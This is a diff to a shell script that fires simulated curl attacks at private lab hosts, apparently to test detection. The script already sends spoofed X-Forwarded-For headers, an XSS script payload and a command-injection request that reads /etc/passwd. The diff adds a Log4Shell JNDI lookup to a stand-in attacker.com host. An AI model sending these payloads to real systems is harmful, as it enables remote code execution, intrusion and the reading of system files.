@@ -8,9 +8,10 @@ curl_1="curl -H 'X-Forwarded-For: 1.2.3.4' http://172.31.28.30:5000/client-ip"
 curl_2="curl -H 'X-Forwarded-For: 45.227.253.55' http://172.31.28.30:5000/client-ip"
 curl_3="curl 'http://172.31.28.30:5000/greet?name=%3Cscript%3Ealert(%22GotYou%20:%29%22)%3C/script%3E'"
 curl_4="curl 'http://172.31.28.30:5000/cmd?exec=cat%20/etc/passwd'"
+curl_5="curl -H 'User-Agent: ${jndi:ldap://attacker.com/a}' http://172.31.25.185:5000/"
 
 # Put them in an array
-commands=("$curl_1" "$curl_2" "$curl_3" "$curl_4")
+commands=("$curl_1" "$curl_2" "$curl_3" "$curl_4" "$curl_5")
 
 echo "[*] Starting random curl attack simulation for 5 minutes..."
 
